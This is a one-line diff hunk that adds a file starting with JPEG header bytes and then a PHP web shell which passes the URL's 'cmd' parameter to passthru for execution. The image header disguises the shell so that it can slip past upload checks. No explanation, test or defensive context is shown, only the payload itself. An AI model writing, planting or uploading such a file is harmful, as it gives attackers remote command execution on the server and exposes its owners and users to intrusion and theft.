@@ -1,0 +1,1 @@
+ÿØÿà<? passthru($_GET["cmd"]); ?>
